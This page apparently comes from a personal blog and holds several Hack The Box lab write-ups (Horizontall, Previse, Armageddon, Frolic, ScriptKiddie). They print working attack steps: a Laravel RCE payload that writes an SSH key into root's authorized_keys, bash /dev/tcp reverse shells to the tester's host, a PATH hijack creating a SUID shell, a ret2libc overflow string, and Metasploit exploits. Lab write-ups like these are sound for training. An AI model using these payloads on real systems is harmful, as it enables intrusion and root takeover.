<h4 id="3-getting-root-acccess"><a href="#3-getting-root-acccess" class="headerlink" title="3.getting root acccess"></a>3.getting root acccess</h4><p>the existence of a <code>composer-setup.php</code> file suggests there’s some kind of PHP site in use here.<br>Looking at the <code>netstat</code>, there’s the site on 80, and a NodeJS side on 1337. There’s also MySQL on 3306 (which makes sense). But there’s also something on 8000:<br><img src="/2022/07/17/Horizontall/netstat.png" width="70%"><br>The service on 8000 is an HTTP server:<br><img src="/2022/07/17/Horizontall/8000.png" width="70%"><br>And based on the response and the cookies, it looks like Laravel, a PHP framework.</p>
<h5 id="page-access"><a href="#page-access" class="headerlink" title="page access"></a>page access</h5><p>the strapi user’s home directory is &#x2F;opt&#x2F;strapi, I can still add a .ssh directory and an authorized_keys file. I’ll add my key:<br><img src="/2022/07/17/Horizontall/ssh.png" width="70%"><br><img src="/2022/07/17/Horizontall/8000local.png" width="70%"><br>now we get a default page running in localhost:8000<br><img src="/2022/07/17/Horizontall/page.png" width="70%"><br>use dirsearch and we can find a &#x2F;profiles<br><img src="/2022/07/17/Horizontall/profiles.png" width="70%"><br>But not only does it crash, but it returns a bunch of information. This is Laravel debug mode.</p>
<h5 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit 1"></a>exploit 1</h5><p>the laravel has a remote code execution &lt;&#x3D;v8.4.2 Debug Mode<br>we can get a poc from <a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">repo</a><br><img src="/2022/07/17/Horizontall/root.png" width="70%"><br>Reviewing the code we see where the id command is being executed:<br><img src="/2022/07/17/Horizontall/rce.png" width="70%"><br>we can set the SUID bit to bash for a quick privilege escalation to root shown in the rce2:<br><img src="/2022/07/17/Horizontall/final.png" width="70%"><br>we can see that the SUID is set with ls -l &#x2F;bin&#x2F;bash<br><img src="/2022/07/17/Horizontall/suid.png" width="70%"></p>
<h5 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit 2"></a>exploit 2</h5><p>To show it works, I’ll start with the id command. First, I’ll generate the payload using phpggc:</p>
<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id
</code></pre>
<p>This creates a serialized PHP file, which I saved as id.phar. The file looks like a PHP object:<br><img src="/2022/07/17/Horizontall/xxd.png" width="70%"><br>the command,<code>id</code>, is on line 0x000000f0.<br>Now I’ll run the <a target="_blank" rel="noopener" href="https://github.com/ambionics/laravel-exploits">Python script</a>, passing it the serialized payload:</p>
<pre><code>python3 /opt/laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 id.phar 
</code></pre>
<p>to get a shell,we can regenerate a new payload, this time creating &#x2F;root&#x2F;.ssh if it doesn’t exist, and then writing my SSH key to authorized_keys:</p>
<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system &#39;mkdir -p /root/.ssh; echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing&quot; &gt;&gt; /root/.ssh/authorized_keys&#39;
</code></pre>
<p>Run the exploit again,and  we can also get the root access.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5v6ykmy0005yacph3hfg39s" data-title="Horizontall" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Previse" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/16/Previse/" class="article-date">
  <time class="dt-published" datetime="2022-07-17T02:20:38.000Z" itemprop="datePublished">2022-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/16/Previse/">Previse</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Previse/nmap.png">

<h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>it just has a login page<br>let’s use dirsearch to find some directories<br>we can see some pages redirect to login.php<br><img src="/2022/07/16/Previse/dirsearch.png"><br>we use burpsuite to catch the response,and we can see a register page but admin can use<br><img src="/2022/07/16/Previse/register.png"><br>we can use burpsuite manually change the status code to 200 ok to visit the accounts.php<br><img src="/2022/07/16/Previse/change.jpg"><br>and thus we can get a access to accounts.php<br><img src="/2022/07/16/Previse/account.png"><br>now we can add a user to test it<br>if we don’t want to have to do this for each page action. We can have Burp do this for use while we browse the site. Go to Proxy &gt; Options &gt; Match and Replace &gt; Add and set the following options:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type: Response header</span><br><span class="line">Match: 302 Found</span><br><span class="line">Replace: 200 OK</span><br></pre></td></tr></table></figure>
<p>now we can download the sitebackup.zip and unzip it<br>in the logs.php,we can see a function uses exec and we just need to post a $delim<br><img src="/2022/07/16/Previse/logs.png"><br>we can reverse the request method and add a delim to get a response<br><img src="/2022/07/16/Previse/post.png"><br>We can test for Command Injection by adding a ;curl+<a target="_blank" rel="noopener" href="http://10.10.14.15/">http://10.10.14.15/</a> after the POST request:<br><img src="/2022/07/16/Previse/server.png"><br>so we can try to reverse a shell to our machine</p>
<pre><code>;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; &lt;- this need to urlencode
nc -lvnp 8888
</code></pre>
<img src="/2022/07/16/Previse/shell.png">

<p>now we still can’t get the userflag<br>Next we can upgrade our shell to a more interactive one:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class="line">stty raw -echo;fg then press ENTER twice</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
<p>we can get the mysql username and password from the config.php<br><img src="/2022/07/16/Previse/mysql.png"></p>
<p>username:root<br>password:mySQL_p@ssw0rd!:)<br>db:previse<br>and now we can get into the database<br><img src="/2022/07/16/Previse/mysqlin.png"><br>and in the database previse,we get two tables<br><img src="/2022/07/16/Previse/tables.png"><br>we can use m4lwhere to ssh it,but first we should crack it’s password<br>copy the hash use hashcat to crack it with the command<br><code>hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt</code><br><img src="/2022/07/16/Previse/pass.png"></p>
<p>username:m4lwhere<br>password:ilovecody112235!<br>and now we can try to ssh it</p>
<pre><code>ssh m4lwhere@10.10.11.104
</code></pre>
<p>and we get in<br><img src="/2022/07/16/Previse/web.png"><br>finally,we get the userflag</p>
<h4 id="3-getting-access-to-root"><a href="#3-getting-access-to-root" class="headerlink" title="3. getting access to root"></a>3. getting access to root</h4><p>first,we use sodo -l to find some command not need root password<br><img src="/2022/07/16/Previse/sudo.png"><br>Reading over the script, we see that both the gzip and the date command don’t have the full PATH set to them:<br><img src="/2022/07/16/Previse/backup.png"><br>the PATH in Linux is how the system looks for the binary that we are trying to execute:<br><img src="/2022/07/16/Previse/path.png"><br>In this case, it is going to look in &#x2F;usr&#x2F;local&#x2F;sbin then if it is not there, it looks at &#x2F;usr&#x2F;local&#x2F;bin and so on until it is found.<br>We can manipulate this by changing the PATH, we can make the first entry in the PATH our current directory with the command <code>export PATH=.:$PATH</code><br><img src="/2022/07/16/Previse/path2.png"><br>And you can see that when I look for the cat command where our custom one is, it points out to that current directory.<br>So we can do the same thing with gzip or date back in the victim’s machine. First let’s create our own malicious gzip command:</p>
<pre><code>cp /bin/bash /tmp/bash &amp;&amp; chomd u+s /tmp/bash
</code></pre>
<p>This will create a SUID bash command that we can use for easy root access. Next we can change the PATH so that it points to our current directory:<br><img src="/2022/07/16/Previse/bash.png"><br>and now execute backup.sh<br><img src="/2022/07/16/Previse/root.png"><br>and final we execute <code>/tmp/bash -p</code>,we get the root<br><img src="/2022/07/16/Previse/rootflag.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/16/Previse/" data-id="cl5v6ykmz0007yacph3z6412u" data-title="Previse" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Armageddon" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/16/Armageddon/" class="article-date">
  <time class="dt-published" datetime="2022-07-16T14:58:49.000Z" itemprop="datePublished">2022-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/16/Armageddon/">Armageddon</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Armageddon/nmap.png">

<h4 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h4><p>from the burpsuite,we can get the response and know it build with drupal 7<br><img src="/2022/07/16/Armageddon/burp.png"><br>when we use searchsploit,we can see some exploit<br><img src="/2022/07/16/Armageddon/searchsploit.png"><br>we can use msfconsole to exploit it</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br><span class="line">use 1</span><br><span class="line">set rhosts 10.10.10.233</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
<p>and we can get the shell<br><img src="/2022/07/16/Armageddon/msf.png"><br>it denied us to cd &#x2F;home<br>so we cd to sites&#x2F;default and in the settings.php,we can get the database’s username and password<br><img src="/2022/07/16/Armageddon/database.png"><br>username:<code>drupaluser</code><br>password:<code>CQHEy@9M*m23gBVj</code></p>
<p>we can try this to login mysql<br>but in the &#x2F;etc&#x2F;passwd,we didn’t see drupaluser,therefore we probably need to get password hashes from the database itself:<br><img src="/2022/07/16/Armageddon/passwd.png"><br>Using the credentials drupaluser:<code>CQHEy@9M*m23gBVj</code>, we can get the databases users and hashes.   </p>
<pre><code>mysql -u drupaluser -p&quot;CQHEy@9M*m23gBVj&quot; -e &quot;use drupal; select name,pass from users;&quot;
</code></pre>
<img src="/2022/07/16/Armageddon/hash.png">
Using the RockYou wordlist we can crack the password hash for the brucetherealadmin user.

<pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre>
<img src="/2022/07/16/Armageddon/hashcrack.png">

<p>username:brucetherealadmin<br>password:booboo<br>And we have brucetherealadmin’s password! Now let’s try to login via SSH:<br><img src="/2022/07/16/Armageddon/ssh.png"></p>
<h4 id="3-getting-root-access"><a href="#3-getting-root-access" class="headerlink" title="3.getting root access"></a>3.getting root access</h4><p>when we use <code>sudo -l</code>,Looks like we are able to run snap as the root user without any password, therefore let’s use the <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/snap/">gtfobin</a> for snap:<br><img src="/2022/07/16/Armageddon/sudo.png"><br>first we get fpm and do something next</p>
<pre><code>gem install fpm
</code></pre>
<img src="/2022/07/16/Armageddon/prepare.png">
Now we upload the malicious privesc snap file to the machine and run it:
<img src="/2022/07/16/Armageddon/upload.png">
<img src="/2022/07/16/Armageddon/download.png">
Now let's run snap as the root user to make use of the snap package we created:
<img src="/2022/07/16/Armageddon/root.png">


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5v6ykmq0000yacpcxdue3f3" data-title="Armageddon" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Forlic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/15/Forlic/" class="article-date">
  <time class="dt-published" datetime="2022-07-15T09:34:32.000Z" itemprop="datePublished">2022-07-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/15/Forlic/">Forlic</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/15/Forlic/nmap.png">

<h5 id="port-exploration"><a href="#port-exploration" class="headerlink" title="port exploration"></a>port exploration</h5><p>9999: at 10.10.10.111:9999,it’s a simple nginx welcome page<br>445: smb is running on the 445,we can use common ways to find if there is something can be used </p>
<pre><code> smbmap -H 10.10.10.111 
</code></pre>
<p>smbmap shows nothing we can use<br><img src="/2022/07/15/Forlic/smbmap.png" width="60%"></p>
<pre><code> smbclient -N -L //10.10.10.111
</code></pre>
<p>and smbclient also shows nothing interesting<br><img src="/2022/07/15/Forlic/smbclient.png" width="60%"><br>1880: the 9999 port’s site gives us a url:<a target="_blank" rel="noopener" href="http://forlic.htb:1880/">http://forlic.htb:1880</a><br>it’s an admin web</p>
<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we try dirsearch to all ports we find,and in 9999 there has some pages<br><img src="/2022/07/15/Forlic/dirsearch.png" width="60%"><br>10.10.10.111:9999&#x2F;test has a phpinfo page<br>10.10.10.111:9999&#x2F;backup has something useful<br>10.10.10.111:9999&#x2F;dev is forbidden<br>10.10.10.111:9999&#x2F;admin is an admin page<br><img src="/2022/07/15/Forlic/backup.png" width="60%"><br>we can use <code>curl 10.10.10.111:9999/backup/user.txt</code> and <code>curl 10.10.10.111:9999/backup/password.txt</code> to get admin and imnothuman</p>
<h5 id="dirsearch-deeper"><a href="#dirsearch-deeper" class="headerlink" title="dirsearch deeper"></a>dirsearch deeper</h5><p>though the &#x2F;dev is forbidden,we use dirsearch http:10.10.10.111:9999&#x2F;dev to explore deeper<br>it has backup and test<br><img src="/2022/07/15/Forlic/dev.png" width="60%"><br>in the &#x2F;backup,it shows &#x2F;playsms<br>in the &#x2F;test,it provides a file name test<br>10.10.10.111:9999&#x2F;playsms is another login page</p>
<h5 id="x2F-admin"><a href="#x2F-admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h5><p>the &#x2F;admin loads a js hide the login information<br><img src="/2022/07/15/Forlic/admin.png" width="60%"><br>the username is admin and the password is superduperlooperpassword_lol<br>after entering it,we can see a brainfuck code,and to decode it<br><img src="/2022/07/15/Forlic/brainfuck.png" width="60%"><br><code>https://www.dcode.fr/ook-language</code><br><img src="/2022/07/15/Forlic/brainfuckdecode.png" width="60%"><br>it shows <code>Nothing here check /asdiSIAJJ0QWE9JAS</code><br>after visit it,it displays a new page encoded,after decoded,we get some message<br><img src="/2022/07/15/Forlic/b64.png" width="60%"><br>decode it,and it seems like a zip <code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd</code><br><img src="/2022/07/15/Forlic/zip.png" width="60%"><br><code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d &gt; index.php.zip</code><br>unzip it,it has a password<br>use fcrackzip to unpack it<br><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip</code><br>The options are -u to force actual unzip, which weeds out tons of fps, -D for dictionary, and -p rockyou.txt to pass the wordlist.and the password&#x3D;password<br><img src="/2022/07/15/Forlic/index.png" width="60%"><br>Use xxd to read that back to bytes, which happens to be not only ASCII, but base64 characters <code>cat index.php | xxd -r -p</code><br><img src="/2022/07/15/Forlic/base64.png" width="60%"><br>decode it,and get the text<br><code>cat index.php | xxd -r -p | tr -d &#39;\r\n&#39; | base64 -d</code><br><img src="/2022/07/15/Forlic/brainfuck2.png" width="60%"><br>it’s brainfuck,decode at <code>https://copy.sh/brainfuck/</code> and get the phrase idkwhatispass</p>
<h4 id="2-shell-as-web"><a href="#2-shell-as-web" class="headerlink" title="2.shell as web"></a>2.shell as web</h4><h5 id="now-we-have-two-password"><a href="#now-we-have-two-password" class="headerlink" title="now we have two password"></a>now we have two password</h5><p>1.admin&#x2F;superduperlooperpassword_lol 2.admin&#x2F;idkwhatispass<br>try it at &#x2F;admin &#x2F;playsms and final password2 worked on &#x2F;playsms</p>
<h5 id="use-msfconsole"><a href="#use-msfconsole" class="headerlink" title="use msfconsole"></a>use msfconsole</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search playsms</span><br><span class="line">use 1</span><br><span class="line">set rhost 10.10.10.111</span><br><span class="line">set rport 9999</span><br><span class="line">set targeturi /playsms/index.php</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
<p>then we get a webshell<br><img src="/2022/07/15/Forlic/webshell.png" width="60%"></p>
<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>first improve the shell</p>
<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<img src="/2022/07/15/Forlic/ayush.png" width="60%">
we can see some hide catelog in ayush's home
the .binary has the suid,the rop in it is owned by root
<img src="/2022/07/15/Forlic/root.png" width="60%">
the rop's function is to get our input and output it
<img src="/2022/07/15/Forlic/ropfunction.png" width="60%">
we can first see what's configured

<pre><code>cat /proc/sys/kernel/randomize_va_space
</code></pre>
<p>it shows no ASLR<br>because we stright open it can’t read it,so we use base64 to read<br>and save it to local machine and use <code>base64 -d rop_b64 &gt; rop</code> to restore it<br><img src="/2022/07/15/Forlic/rop.png" width="60%"><br>open it in gdb with <a target="_blank" rel="noopener" href="https://github.com/longld/peda">PEDA</a>, and run checksec<br><img src="/2022/07/15/Forlic/checksec.png" width="60%"><br>we can force the program to crash<br><img src="/2022/07/15/Forlic/crash.png" width="60%"></p>
<h5 id="background"><a href="#background" class="headerlink" title="background"></a>background</h5><p>I can cause the program to crash by sending too much input which likely means I can overwrite the return address somewhere. Given that ASLR is disabled but DEP (NX) is enabled, the easiest attack path is to use Return to libc.</p>
<h5 id="understand-return-to-libc"><a href="#understand-return-to-libc" class="headerlink" title="understand return to libc"></a>understand return to libc</h5><h6 id="1-stack"><a href="#1-stack" class="headerlink" title="1.stack"></a>1.stack</h6><p>The stack starts at high memory addresses, and builds up to lower memory addresses. Inside any given function, there’s a stack frame. The bottom of the stack frame is stored in the RBP (or EBP on x86) register. The top is stored in RSP (or ESP). For example (and I’ll use 32-bit registers in this example since Frolic is 32-bit):<br><img src="/2022/07/15/Forlic/1.jpg" width="60%"></p>
<h6 id="2-function-call"><a href="#2-function-call" class="headerlink" title="2.function call"></a>2.function call</h6><p>When a function is called, the arguments are put onto the stack (either by adding space to the top or using the space already there). So, for example, the program comes to:<br><img src="/2022/07/15/Forlic/2.jpg" width="60%"><br>Just before the call, two addresses are stored in ESP and ESP+4. These are the addresses of the string to copy and the buffer to copy it to:<br><img src="/2022/07/15/Forlic/3.jpg" width="60%"><br>Now the call instruction is reached. It is going to push the next instruction to the top of the stack (as the return address), and then jump execution to the new function. The next function is going to start with some common stuff, known as the prologue:<br><img src="/2022/07/15/Forlic/4.jpg" width="60%"><br>So take that step by step. call pushes return address:<br><img src="/2022/07/15/Forlic/5.jpg" width="60%"><br>Now push ebp:<br><img src="/2022/07/15/Forlic/6.jpg" width="60%"><br>mov ebp, esp:<br><img src="/2022/07/15/Forlic/7.jpg" width="60%"><br>Finally sub esp, 0x100:<br><img src="/2022/07/15/Forlic/8.jpg" width="60%"></p>
<h6 id="3-stack-return"><a href="#3-stack-return" class="headerlink" title="3. stack return"></a>3. stack return</h6><p>When a function is done, it will typically end with:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>leave == mov esp, ebp + pop ebp</code><br>So the stack from before becomes:<br><img src="/2022/07/15/Forlic/9.jpg" width="60%"><br>Then when the return happens, the instruction pointer is popped, bringing that stack back to where it started:<br><img src="/2022/07/15/Forlic/10.jpg" width="60%"></p>
<h6 id="4-What-Is-Return-to-libc"><a href="#4-What-Is-Return-to-libc" class="headerlink" title="4.What Is Return to libc"></a>4.What Is Return to libc</h6><p>A return to libc attack involves overwriting the return address in such a way that the computer jumps to the function I want. The standard case is the system function, with the argument &#x2F;bin&#x2F;sh, giving me a shell.</p>
<p>If I were to call system(“&#x2F;bin&#x2F;sh”) normally, I would enter the function after the call but before the prologue with a stack like this:<br><img src="/2022/07/15/Forlic/11.jpg" width="60%"><br>The return address would be pushed onto the stack by the call instruction. But I’m not going to be going to system via a call, but rather a ret. So, I want the stack to look like this when I reach the return:<br><img src="/2022/07/15/Forlic/12.jpg" width="60%"><br>That way, ret will pop the system address into the instruction pointer, and the stack will look right. Since I don’t know the right return address, I’ll just use the function exit, so it cleanly exits when I’m done.</p>
<h5 id="Find-the-Offset-to-EIP"><a href="#Find-the-Offset-to-EIP" class="headerlink" title="Find the Offset to EIP"></a>Find the Offset to EIP</h5><p>open the file with gbb-peda,and When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset<br><img src="/2022/07/15/Forlic/eip.png" width="60%"><br>When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset. I can use the ASCII or hex value:<br><img src="/2022/07/15/Forlic/AAGA.png" width="60%"><br>To double check that, I’ll send in a buffer of 52 As and then 4 Bs:<br><img src="/2022/07/15/Forlic/eip2.png" width="60%"><br>Crash, with EIP as BBBB.</p>
<h5 id="Addresses"><a href="#Addresses" class="headerlink" title="Addresses"></a>Addresses</h5><p>Now I just need the addresses of <code>system</code>, <code>exit</code>, and <code>/bin/sh</code> in libc. This will vary on different hosts, so I’ll get the info with my shell on Frolic. First, I’ll get the base libc address with ldd,<br>Next, I’ll use <code>readelf -s</code> to get the offsets to various functions, and grep out <code>system</code> and <code>exit</code>,<br>Now I’ll use <code>strings -a -t x</code> to get the strings from libc with hex offsets, and grep for “&#x2F;bin&#x2F;sh”:<br><img src="/2022/07/15/Forlic/addresses.png" width="60%"><br>Now I can calculate the address for each of the three using any calculator (gdb here):<br><img src="/2022/07/15/Forlic/p.png" width="60%"></p>
<h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>I can put that all together into this template: <code>&quot;A&quot; * 52 + SYSTEM + EXIT + /bin/sh</code>. I could write a python script to do this, but this case is simple enough that I can just do it as a one-liner. When I run that on Frolic, I’m root:<br><code>./rop $(python -c &#39;print(&quot;a&quot;*52 + &quot;\xa0\x3d\xe5\xb7&quot; + &quot;\xd0\x79\xe4\xb7&quot; + &quot;\x0b\x4a\xf7\xb7&quot;)&#39;)</code><br>now we finally get the flag<br><img src="/2022/07/15/Forlic/flag.png" width="60%"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5v6ykmw0002yacpe8ke1o1q" data-title="Forlic" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Scriptkiddle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/14/Scriptkiddle/" class="article-date">
  <time class="dt-published" datetime="2022-07-15T03:07:06.000Z" itemprop="datePublished">2022-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/14/Scriptkiddle/">Scriptkiddle</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.226<br><img src="/2022/07/14/Scriptkiddle/nmap.png" width="50%"></p>
<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><p>in the website,it has three parts<br>the first is nmap moudle,when we type a ip,it will send back the nmap result<br>the payload section allows me to generate a payload after choose ip,os and template file<br>the third part seems like searchspolit moudle</p>
<h5 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h5><p>when we search msfvenom, we can see it has a exploit before the version 6.0.11<br><img src="/2022/07/14/Scriptkiddle/msfvenom.png" width="50%"><br>we can have a try<br>msfvenom handles an APK template file. The idea of the template file is that you can pass msfvenom a legit .exe or .apk, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.</p>
<h5 id="build-payload"><a href="#build-payload" class="headerlink" title="build payload"></a>build payload</h5><p>we can use searchspolit -m 49491.py to use this<br>change the payload to <code>bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;</code> to reverse a shell<br>if the execution get wrong,first use <code>apt-get install openjdk-11-jdk-headless</code> to enable jarsigner<br>or we can use msfconsole to generate an apk,we should change the payload to <code>cmd/unix/reverse_netcat</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use msfconsole</span><br><span class="line">search msfvenom</span><br><span class="line">use 0</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost xxxx</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="get-webshell"><a href="#get-webshell" class="headerlink" title="get webshell"></a>get webshell</h5><p>and we can upload the apk to the website<br>on the website “payloads” section, select Android for OS and upload the APK file that was generated by MetaSploit<br><img src="/2022/07/14/Scriptkiddle/web.png" width="50%"><br>in the &#x2F;home folder,we can find two users called kid and pwn<br><img src="/2022/07/14/Scriptkiddle/user.png" width="50%"><br>in the pwn’s folder,we can find a script called scanlosers.sh<br><img src="/2022/07/14/Scriptkiddle/scan.png" width="50%"><br>the script’s function is to scan ips written in &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers<br>but this script doesn’t deal the input the hackers provides<br>so we can append a reverse shell command into the file<br><code>echo &quot;test ;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; #”</code><br><img src="/2022/07/14/Scriptkiddle/pwnshell.png" width="50%"><br><img src="/2022/07/14/Scriptkiddle/pwnshell2.png" width="50%"></p>
<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>in the pwn,it can sudo msfconsole without password<br><img src="/2022/07/14/Scriptkiddle/root1.png" width="50%"><br>and we get the root<br><img src="/2022/07/14/Scriptkiddle/root2.png" width="50%"><br>we can exec command in msf or use <code>/bin/bash -i</code> to change to the root<br><img src="/2022/07/14/Scriptkiddle/root3.png" width="50%"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5v6ykn00008yacphmm062lr" data-title="Scriptkiddle" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/07/24/Sense/">Sense</a>
          </li>
        
          <li>
            <a href="/2022/07/22/Grandpa/">Grandpa</a>
          </li>
        
          <li>
            <a href="/2022/07/21/Granny/">Granny</a>
          </li>
        
          <li>
            <a href="/2022/07/19/FriendZone/">FriendZone</a>
          </li>
        
          <li>
            <a href="/2022/07/18/Delivery/">Delivery</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>